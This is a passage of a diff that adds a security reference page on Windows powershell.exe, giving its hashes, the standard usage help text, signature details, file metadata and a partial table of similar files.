@@ -1,0 +1,1594 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>powershell.exe | Windows PowerShell &#124; STRONTIC</title>
+<meta name="description" content="What is powershell.exe?">
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="STRONTIC">
+<meta property="og:title" content="powershell.exe | Windows PowerShell">
+<meta property="og:url" content="https://strontic.github.io/xcyclopedia/library/powershell.exe-65D86C34814C02569E2AD53FD24E7F61.html">
+
+
+  <meta property="og:description" content="What is powershell.exe?">
+
+
+
+
+
+  <meta name="twitter:site" content="@strontic20">
+  <meta name="twitter:title" content="powershell.exe | Windows PowerShell">
+  <meta name="twitter:description" content="What is powershell.exe?">
+  <meta name="twitter:url" content="https://strontic.github.io/xcyclopedia/library/powershell.exe-65D86C34814C02569E2AD53FD24E7F61.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://strontic.github.io/xcyclopedia/library/powershell.exe-65D86C34814C02569E2AD53FD24E7F61.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Organization",
+      "url": "https://strontic.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="STRONTIC Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--splash wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/strontic-favicon_large_gray.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          STRONTIC
+          <span class="site-subtitle">Security. Automation. Analytics.</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/xcyclopedia/intro">xCyclopedia</a>
+            </li><li class="masthead__menu-item">
+              <a href="https://github.com/strontic">Github</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://strontic.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+		
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/xcyclopedia" itemprop="item"><span itemprop="name">Xcyclopedia</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        
+		
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/xcyclopedia/library" itemprop="item"><span itemprop="name">Library</span></a>
+          <meta itemprop="position" content="3" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">powershell.exe | Windows PowerShell</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  <article class="splash" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="            powershell.exe      Windows PowerShell      ">
+    <meta itemprop="description" content="What is powershell.exe?">
+    
+    
+
+    <section class="page__content" itemprop="text">
+      <h1 id="powershellexe">powershell.exe</h1>
+
+<ul>
+  <li>File Path: <code class="language-plaintext highlighter-rouge">C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></li>
+  <li>Description: Windows PowerShell</li>
+</ul>
+
+<h2 id="hashes">Hashes</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Hash</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MD5</td>
+      <td><code class="language-plaintext highlighter-rouge">65D86C34814C02569E2AD53FD24E7F61</code></td>
+    </tr>
+    <tr>
+      <td>SHA1</td>
+      <td><code class="language-plaintext highlighter-rouge">21D5224E20A4BE7F303AB6C4B9F219D0D70904EE</code></td>
+    </tr>
+    <tr>
+      <td>SHA256</td>
+      <td><code class="language-plaintext highlighter-rouge">8133502266008B77DE7921451E1210B0EF3F0ED2DB7D8D3EE0C3350D856FA6FA</code></td>
+    </tr>
+    <tr>
+      <td>SHA384</td>
+      <td><code class="language-plaintext highlighter-rouge">D3B15ADFD4E2D663967BB1235D50EF4B817A05514363331F915A0A7068774A96D20DB3B3CC167D373411DA2CE959C564</code></td>
+    </tr>
+    <tr>
+      <td>SHA512</td>
+      <td><code class="language-plaintext highlighter-rouge">81DA07AE71AB530F07E5B27796954453ADD82518B69F9A26463DFB6E172C1309C9E53B70DB122204A9DC9DED936975E6EDC6BF876A84CED1F2FE20C2884C8D2C</code></td>
+    </tr>
+    <tr>
+      <td>SSDEEP</td>
+      <td><code class="language-plaintext highlighter-rouge">6144:8AZEzZR4p/WwO9sV1yZywi/PzNKXzJ7BapCK5d3klRzULOnWyjLsPhAQzqO:8SW2KXzJ4pdd3klnnWosPhnzq</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="runtime-data">Runtime Data</h2>
+
+<h3 id="usage-stdout">Usage (stdout):</h3>
+<div class="language-cmhg highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ni">PowerShell</span><span class="err">[.</span><span class="ni">exe</span><span class="err">]</span> <span class="err">[-</span><span class="ni">PSConsoleFile</span> <span class="err">&lt;</span><span class="ni">file</span><span class="err">&gt;</span> <span class="err">|</span> <span class="err">-</span><span class="ni">Version</span> <span class="err">&lt;</span><span class="ni">version</span><span class="err">&gt;]</span>
+    <span class="err">[-</span><span class="ni">NoLogo</span><span class="err">]</span> <span class="err">[-</span><span class="ni">NoExit</span><span class="err">]</span> <span class="err">[-</span><span class="ni">Sta</span><span class="err">]</span> <span class="err">[-</span><span class="ni">Mta</span><span class="err">]</span> <span class="err">[-</span><span class="ni">NoProfile</span><span class="err">]</span> <span class="err">[-</span><span class="ni">NonInteractive</span><span class="err">]</span>
+    <span class="err">[-</span><span class="ni">InputFormat</span> <span class="err">{</span><span class="ni">Text</span> <span class="err">|</span> <span class="ni">XML</span><span class="err">}]</span> <span class="err">[-</span><span class="ni">OutputFormat</span> <span class="err">{</span><span class="ni">Text</span> <span class="err">|</span> <span class="ni">XML</span><span class="err">}]</span>
+    <span class="err">[-</span><span class="ni">WindowStyle</span> <span class="err">&lt;</span><span class="ni">style</span><span class="err">&gt;]</span> <span class="err">[-</span><span class="ni">EncodedCommand</span> <span class="err">&lt;</span><span class="ni">Base64EncodedCommand</span><span class="err">&gt;]</span>
+    <span class="err">[-</span><span class="ni">ConfigurationName</span> <span class="err">&lt;</span><span class="ni">string</span><span class="err">&gt;]</span>
+    <span class="err">[-</span><span class="ni">File</span> <span class="err">&lt;</span><span class="ni">filePath</span><span class="err">&gt;</span> <span class="err">&lt;</span><span class="ni">args</span><span class="err">&gt;]</span> <span class="err">[-</span><span class="ni">ExecutionPolicy</span> <span class="err">&lt;</span><span class="ni">ExecutionPolicy</span><span class="err">&gt;]</span>
+    <span class="err">[-</span><span class="ni">Command</span> <span class="err">{</span> <span class="err">-</span> <span class="err">|</span> <span class="err">&lt;</span><span class="ni">script</span><span class="err">-</span><span class="ni">block</span><span class="err">&gt;</span> <span class="err">[-</span><span class="ni">args</span> <span class="err">&lt;</span><span class="ni">arg</span><span class="err">-</span><span class="ni">array</span><span class="err">&gt;]</span>
+                  <span class="err">|</span> <span class="err">&lt;</span><span class="ni">string</span><span class="err">&gt;</span> <span class="err">[&lt;</span><span class="ni">CommandParameters</span><span class="err">&gt;]</span> <span class="err">}</span> <span class="err">]</span>
+
+<span class="ni">PowerShell</span><span class="err">[.</span><span class="ni">exe</span><span class="err">]</span> <span class="err">-</span><span class="ni">Help</span> <span class="err">|</span> <span class="err">-?</span> <span class="err">|</span> <span class="p">/</span><span class="err">?</span>
+
+<span class="err">-</span><span class="ni">PSConsoleFile</span>
+    <span class="ni">Loads</span> <span class="ni">the</span> <span class="ni">specified</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">console</span> <span class="ni">file</span><span class="err">.</span> <span class="ni">To</span> <span class="ni">create</span> <span class="err">a</span> <span class="ni">console</span>
+    <span class="ni">file</span><span class="p">,</span> <span class="ni">use</span> <span class="ni">Export</span><span class="err">-</span><span class="ni">Console</span> <span class="ni">in</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">Version</span>
+    <span class="ni">Starts</span> <span class="ni">the</span> <span class="ni">specified</span> <span class="ni">version</span> <span class="ni">of</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span><span class="err">.</span> 
+    <span class="ni">Enter</span> <span class="err">a</span> <span class="ni">version</span> <span class="ni">number</span> <span class="ni">with</span> <span class="ni">the</span> <span class="ni">parameter</span><span class="p">,</span> <span class="ni">such</span> <span class="ni">as</span> <span class="s">"-version 2.0"</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">NoLogo</span>
+    <span class="ni">Hides</span> <span class="ni">the</span> <span class="ni">copyright</span> <span class="ni">banner</span> <span class="ni">at</span> <span class="ni">startup</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">NoExit</span>
+    <span class="ni">Does</span> <span class="ni">not</span> <span class="ni">exit</span> <span class="ni">after</span> <span class="ni">running</span> <span class="ni">startup</span> <span class="ni">commands</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">Sta</span>
+    <span class="ni">Starts</span> <span class="ni">the</span> <span class="ni">shell</span> <span class="ni">using</span> <span class="err">a</span> <span class="ni">single</span><span class="err">-</span><span class="ni">threaded</span> <span class="ni">apartment</span><span class="err">.</span>
+    <span class="ni">Single</span><span class="err">-</span><span class="ni">threaded</span> <span class="ni">apartment</span> <span class="p">(</span><span class="ni">STA</span><span class="p">)</span> <span class="ni">is</span> <span class="ni">the</span> <span class="ni">default</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">Mta</span>
+    <span class="ni">Start</span> <span class="ni">the</span> <span class="ni">shell</span> <span class="ni">using</span> <span class="err">a</span> <span class="ni">multithreaded</span> <span class="ni">apartment</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">NoProfile</span>
+    <span class="ni">Does</span> <span class="ni">not</span> <span class="ni">load</span> <span class="ni">the</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">profile</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">NonInteractive</span>
+    <span class="ni">Does</span> <span class="ni">not</span> <span class="ni">present</span> <span class="ni">an</span> <span class="ni">interactive</span> <span class="ni">prompt</span> <span class="ni">to</span> <span class="ni">the</span> <span class="ni">user</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">InputFormat</span>
+    <span class="ni">Describes</span> <span class="ni">the</span> <span class="ni">format</span> <span class="ni">of</span> <span class="ni">data</span> <span class="ni">sent</span> <span class="ni">to</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span><span class="err">.</span> <span class="ni">Valid</span> <span class="ni">values</span> <span class="ni">are</span>
+    <span class="s">"Text"</span> <span class="p">(</span><span class="ni">text</span> <span class="ni">strings</span><span class="p">)</span> <span class="ni">or</span> <span class="s">"XML"</span> <span class="p">(</span><span class="ni">serialized</span> <span class="ni">CLIXML</span> <span class="ni">format</span><span class="p">)</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">OutputFormat</span>
+    <span class="ni">Determines</span> <span class="ni">how</span> <span class="ni">output</span> <span class="ni">from</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">is</span> <span class="ni">formatted</span><span class="err">.</span> <span class="ni">Valid</span> <span class="ni">values</span>
+    <span class="ni">are</span> <span class="s">"Text"</span> <span class="p">(</span><span class="ni">text</span> <span class="ni">strings</span><span class="p">)</span> <span class="ni">or</span> <span class="s">"XML"</span> <span class="p">(</span><span class="ni">serialized</span> <span class="ni">CLIXML</span> <span class="ni">format</span><span class="p">)</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">WindowStyle</span>
+    <span class="ni">Sets</span> <span class="ni">the</span> <span class="ni">window</span> <span class="ni">style</span> <span class="ni">to</span> <span class="ni">Normal</span><span class="p">,</span> <span class="ni">Minimized</span><span class="p">,</span> <span class="ni">Maximized</span> <span class="ni">or</span> <span class="ni">Hidden</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">EncodedCommand</span>
+    <span class="ni">Accepts</span> <span class="err">a</span> <span class="ni">base</span><span class="err">-</span><span class="m">64</span><span class="err">-</span><span class="ni">encoded</span> <span class="ni">string</span> <span class="ni">version</span> <span class="ni">of</span> <span class="err">a</span> <span class="ni">command</span><span class="err">.</span> <span class="ni">Use</span> <span class="ni">this</span> <span class="ni">parameter</span> 
+    <span class="ni">to</span> <span class="ni">submit</span> <span class="ni">commands</span> <span class="ni">to</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">that</span> <span class="ni">require</span> <span class="ni">complex</span> <span class="ni">quotation</span> 
+    <span class="ni">marks</span> <span class="ni">or</span> <span class="ni">curly</span> <span class="ni">braces</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">ConfigurationName</span>
+    <span class="ni">Specifies</span> <span class="err">a</span> <span class="ni">configuration</span> <span class="ni">endpoint</span> <span class="ni">in</span> <span class="ni">which</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">is</span> <span class="ni">run</span><span class="err">.</span>
+    <span class="ni">This</span> <span class="ni">can</span> <span class="ni">be</span> <span class="ni">any</span> <span class="ni">endpoint</span> <span class="ni">registered</span> <span class="ni">on</span> <span class="ni">the</span> <span class="ni">local</span> <span class="ni">machine</span> <span class="ni">including</span> <span class="ni">the</span>
+    <span class="ni">default</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">remoting</span> <span class="ni">endpoints</span> <span class="ni">or</span> <span class="err">a</span> <span class="ni">custom</span> <span class="ni">endpoint</span> <span class="ni">having</span>
+    <span class="ni">specific</span> <span class="ni">user</span> <span class="ni">role</span> <span class="ni">capabilities</span><span class="err">.</span>
+    
+<span class="err">-</span><span class="ni">File</span>
+    <span class="ni">Runs</span> <span class="ni">the</span> <span class="ni">specified</span> <span class="ni">script</span> <span class="ni">in</span> <span class="ni">the</span> <span class="ni">local</span> <span class="ni">scope</span> <span class="p">(</span><span class="s">"dot-sourced"</span><span class="p">),</span> <span class="ni">so</span> <span class="ni">that</span> <span class="ni">the</span> 
+    <span class="ni">functions</span> <span class="ni">and</span> <span class="ni">variables</span> <span class="ni">that</span> <span class="ni">the</span> <span class="ni">script</span> <span class="ni">creates</span> <span class="ni">are</span> <span class="ni">available</span> <span class="ni">in</span> <span class="ni">the</span> 
+    <span class="ni">current</span> <span class="ni">session</span><span class="err">.</span> <span class="ni">Enter</span> <span class="ni">the</span> <span class="ni">script</span> <span class="ni">file</span> <span class="ni">path</span> <span class="ni">and</span> <span class="ni">any</span> <span class="ni">parameters</span><span class="err">.</span> 
+    <span class="ni">File</span> <span class="ni">must</span> <span class="ni">be</span> <span class="ni">the</span> <span class="ni">last</span> <span class="ni">parameter</span> <span class="ni">in</span> <span class="ni">the</span> <span class="ni">command</span><span class="p">,</span> <span class="ni">because</span> <span class="ni">all</span> <span class="ni">characters</span> 
+    <span class="ni">typed</span> <span class="ni">after</span> <span class="ni">the</span> <span class="ni">File</span> <span class="ni">parameter</span> <span class="ni">name</span> <span class="ni">are</span> <span class="ni">interpreted</span> 
+    <span class="ni">as</span> <span class="ni">the</span> <span class="ni">script</span> <span class="ni">file</span> <span class="ni">path</span> <span class="ni">followed</span> <span class="ni">by</span> <span class="ni">the</span> <span class="ni">script</span> <span class="ni">parameters</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">ExecutionPolicy</span>
+    <span class="ni">Sets</span> <span class="ni">the</span> <span class="ni">default</span> <span class="ni">execution</span> <span class="ni">policy</span> <span class="ni">for</span> <span class="ni">the</span> <span class="ni">current</span> <span class="ni">session</span> <span class="ni">and</span> <span class="ni">saves</span> <span class="ni">it</span> 
+    <span class="ni">in</span> <span class="ni">the</span> <span class="err">$</span><span class="kd">env:</span><span class="ni">PSExecutionPolicyPreference</span> <span class="ni">environment</span> <span class="ni">variable</span><span class="err">.</span> 
+    <span class="ni">This</span> <span class="ni">parameter</span> <span class="ni">does</span> <span class="ni">not</span> <span class="ni">change</span> <span class="ni">the</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">execution</span> <span class="ni">policy</span> 
+    <span class="ni">that</span> <span class="ni">is</span> <span class="ni">set</span> <span class="ni">in</span> <span class="ni">the</span> <span class="ni">registry</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">Command</span>
+    <span class="ni">Executes</span> <span class="ni">the</span> <span class="ni">specified</span> <span class="ni">commands</span> <span class="p">(</span><span class="ni">and</span> <span class="ni">any</span> <span class="ni">parameters</span><span class="p">)</span> <span class="ni">as</span> <span class="ni">though</span> <span class="ni">they</span> <span class="ni">were</span>
+    <span class="ni">typed</span> <span class="ni">at</span> <span class="ni">the</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">command</span> <span class="ni">prompt</span><span class="p">,</span> <span class="ni">and</span> <span class="ni">then</span> <span class="ni">exits</span><span class="p">,</span> <span class="ni">unless</span> 
+    <span class="ni">NoExit</span> <span class="ni">is</span> <span class="ni">specified</span><span class="err">.</span> <span class="ni">The</span> <span class="ni">value</span> <span class="ni">of</span> <span class="ni">Command</span> <span class="ni">can</span> <span class="ni">be</span> <span class="s">"-"</span><span class="p">,</span> <span class="err">a</span> <span class="ni">string</span><span class="err">.</span> <span class="ni">or</span> <span class="err">a</span>
+    <span class="ni">script</span> <span class="ni">block</span><span class="err">.</span>
+
+    <span class="ni">If</span> <span class="ni">the</span> <span class="ni">value</span> <span class="ni">of</span> <span class="ni">Command</span> <span class="ni">is</span> <span class="s">"-"</span><span class="p">,</span> <span class="ni">the</span> <span class="ni">command</span> <span class="ni">text</span> <span class="ni">is</span> <span class="ni">read</span> <span class="ni">from</span> <span class="ni">standard</span>
+    <span class="ni">input</span><span class="err">.</span>
+
+    <span class="ni">If</span> <span class="ni">the</span> <span class="ni">value</span> <span class="ni">of</span> <span class="ni">Command</span> <span class="ni">is</span> <span class="err">a</span> <span class="ni">script</span> <span class="ni">block</span><span class="p">,</span> <span class="ni">the</span> <span class="ni">script</span> <span class="ni">block</span> <span class="ni">must</span> <span class="ni">be</span> <span class="ni">enclosed</span>
+    <span class="ni">in</span> <span class="ni">braces</span> <span class="p">(</span><span class="err">{}</span><span class="p">)</span><span class="err">.</span> <span class="ni">You</span> <span class="ni">can</span> <span class="ni">specify</span> <span class="err">a</span> <span class="ni">script</span> <span class="ni">block</span> <span class="ni">only</span> <span class="ni">when</span> <span class="ni">running</span> <span class="ni">PowerShell</span><span class="err">.</span><span class="ni">exe</span>
+    <span class="ni">in</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span><span class="err">.</span> <span class="ni">The</span> <span class="ni">results</span> <span class="ni">of</span> <span class="ni">the</span> <span class="ni">script</span> <span class="ni">block</span> <span class="ni">are</span> <span class="ni">returned</span> <span class="ni">to</span> <span class="ni">the</span>
+    <span class="ni">parent</span> <span class="ni">shell</span> <span class="ni">as</span> <span class="ni">deserialized</span> <span class="ni">XML</span> <span class="ni">objects</span><span class="p">,</span> <span class="ni">not</span> <span class="ni">live</span> <span class="ni">objects</span><span class="err">.</span>
+
+    <span class="ni">If</span> <span class="ni">the</span> <span class="ni">value</span> <span class="ni">of</span> <span class="ni">Command</span> <span class="ni">is</span> <span class="err">a</span> <span class="ni">string</span><span class="p">,</span> <span class="ni">Command</span> <span class="ni">must</span> <span class="ni">be</span> <span class="ni">the</span> <span class="ni">last</span> <span class="ni">parameter</span>
+    <span class="ni">in</span> <span class="ni">the</span> <span class="ni">command</span> <span class="p">,</span> <span class="ni">because</span> <span class="ni">any</span> <span class="ni">characters</span> <span class="ni">typed</span> <span class="ni">after</span> <span class="ni">the</span> <span class="ni">command</span> <span class="ni">are</span> 
+    <span class="ni">interpreted</span> <span class="ni">as</span> <span class="ni">the</span> <span class="ni">command</span> <span class="ni">arguments</span><span class="err">.</span>
+
+    <span class="ni">To</span> <span class="ni">write</span> <span class="err">a</span> <span class="ni">string</span> <span class="ni">that</span> <span class="ni">runs</span> <span class="err">a</span> <span class="ni">Windows</span> <span class="ni">PowerShell</span> <span class="ni">command</span><span class="p">,</span> <span class="ni">use</span> <span class="ni">the</span> <span class="kd">format:</span>
+	<span class="s">"&amp; {&lt;command&gt;}"</span>
+    <span class="ni">where</span> <span class="ni">the</span> <span class="ni">quotation</span> <span class="ni">marks</span> <span class="ni">indicate</span> <span class="err">a</span> <span class="ni">string</span> <span class="ni">and</span> <span class="ni">the</span> <span class="ni">invoke</span> <span class="ni">operator</span> <span class="p">(</span><span class="err">&amp;</span><span class="p">)</span>
+    <span class="ni">causes</span> <span class="ni">the</span> <span class="ni">command</span> <span class="ni">to</span> <span class="ni">be</span> <span class="ni">executed</span><span class="err">.</span>
+
+<span class="err">-</span><span class="ni">Help</span><span class="p">,</span> <span class="err">-?</span><span class="p">,</span> <span class="p">/</span><span class="err">?</span>
+    <span class="ni">Shows</span> <span class="ni">this</span> <span class="ni">message</span><span class="err">.</span> <span class="ni">If</span> <span class="ni">you</span> <span class="ni">are</span> <span class="ni">typing</span> <span class="err">a</span> <span class="ni">PowerShell</span><span class="err">.</span><span class="ni">exe</span> <span class="ni">command</span> <span class="ni">in</span> <span class="ni">Windows</span>
+    <span class="ni">PowerShell</span><span class="p">,</span> <span class="ni">prepend</span> <span class="ni">the</span> <span class="ni">command</span> <span class="ni">parameters</span> <span class="ni">with</span> <span class="err">a</span> <span class="ni">hyphen</span> <span class="p">(</span><span class="err">-</span><span class="p">),</span> <span class="ni">not</span> <span class="err">a</span> <span class="ni">forward</span>
+    <span class="ni">slash</span> <span class="p">(/)</span><span class="err">.</span> <span class="ni">You</span> <span class="ni">can</span> <span class="ni">use</span> <span class="ni">either</span> <span class="err">a</span> <span class="ni">hyphen</span> <span class="ni">or</span> <span class="ni">forward</span> <span class="ni">slash</span> <span class="ni">in</span> <span class="ni">Cmd</span><span class="err">.</span><span class="ni">exe</span><span class="err">.</span>
+
+<span class="ni">EXAMPLES</span>
+    <span class="ni">PowerShell</span> <span class="err">-</span><span class="ni">PSConsoleFile</span> <span class="ni">SqlSnapIn</span><span class="err">.</span><span class="ni">Psc1</span>
+    <span class="ni">PowerShell</span> <span class="err">-</span><span class="ni">version</span> <span class="m">2</span><span class="err">.</span><span class="m">0</span> <span class="err">-</span><span class="ni">NoLogo</span> <span class="err">-</span><span class="ni">InputFormat</span> <span class="ni">text</span> <span class="err">-</span><span class="ni">OutputFormat</span> <span class="ni">XML</span>
+    <span class="ni">PowerShell</span> <span class="err">-</span><span class="ni">ConfigurationName</span> <span class="ni">AdminRoles</span>
+    <span class="ni">PowerShell</span> <span class="err">-</span><span class="ni">Command</span> <span class="err">{</span><span class="ni">Get</span><span class="err">-</span><span class="ni">EventLog</span> <span class="err">-</span><span class="ni">LogName</span> <span class="ni">security</span><span class="err">}</span>
+    <span class="ni">PowerShell</span> <span class="err">-</span><span class="ni">Command</span> <span class="s">"&amp; {Get-EventLog -LogName security}"</span>
+
+    <span class="err">#</span> <span class="ni">To</span> <span class="ni">use</span> <span class="ni">the</span> <span class="err">-</span><span class="ni">EncodedCommand</span> <span class="kd">parameter:</span>
+    <span class="err">$</span><span class="ni">command</span> <span class="err">=</span> <span class="err">'</span><span class="ni">dir</span> <span class="s">"c:\program files"</span> <span class="err">'</span>
+    <span class="err">$</span><span class="ni">bytes</span> <span class="err">=</span> <span class="err">[</span><span class="ni">System</span><span class="err">.</span><span class="ni">Text</span><span class="err">.</span><span class="ni">Encoding</span><span class="err">]::</span><span class="ni">Unicode</span><span class="err">.</span><span class="ni">GetBytes</span><span class="p">(</span><span class="err">$</span><span class="ni">command</span><span class="p">)</span>
+    <span class="err">$</span><span class="ni">encodedCommand</span> <span class="err">=</span> <span class="err">[</span><span class="ni">Convert</span><span class="err">]::</span><span class="ni">ToBase64String</span><span class="p">(</span><span class="err">$</span><span class="ni">bytes</span><span class="p">)</span>
+    <span class="ni">powershell</span><span class="err">.</span><span class="ni">exe</span> <span class="err">-</span><span class="ni">encodedCommand</span> <span class="err">$</span><span class="ni">encodedCommand</span>
+
+</code></pre></div></div>
+
+<h3 id="child-processes">Child Processes:</h3>
+<p>conhost.exe</p>
+
+<h2 id="signature">Signature</h2>
+
+<ul>
+  <li>Status: Signature verified.</li>
+  <li>Serial: <code class="language-plaintext highlighter-rouge">33000001733031072665B8B9B3000000000173</code></li>
+  <li>Thumbprint: <code class="language-plaintext highlighter-rouge">14590DC5C3AAF238FCFD7785B4B93F4071402C34</code></li>
+  <li>Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</li>
+  <li>Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</li>
+</ul>
+
+<h2 id="file-metadata">File Metadata</h2>
+
+<ul>
+  <li>Original Filename: PowerShell.EXE.MUI</li>
+  <li>Product Name: Microsoft Windows Operating System</li>
+  <li>Company Name: Microsoft Corporation</li>
+  <li>File Version: 10.0.14393.0 (rs1_release.160715-1616)</li>
+  <li>Product Version: 10.0.14393.0</li>
+  <li>Language: English (United States)</li>
+  <li>Legal Copyright:  Microsoft Corporation. All rights reserved.</li>
+</ul>
+
+<h2 id="file-similarity-ssdeep-match">File Similarity (ssdeep match)</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>File</th>
+      <th>Score</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-04029E121A0CFA5991749937DD22A1D9.html">C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>85</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-097CE5761C89434367598B34FE32893B.html">C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>91</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-7353F60B1739074EB17C5F4DDDEFE239.html">C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>88</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-C031E215B8B08C752BF362F6D4C5D3AD.html">C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>75</td>
+    </tr>
+    <tr>
+      <td><a href="/xcyclopedia/library/powershell.exe-CDA48FC75952AD12D99E526D0B6BF70A.html">C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe</a></td>
+      <td>85</td>
+    </tr>
+    <tr>
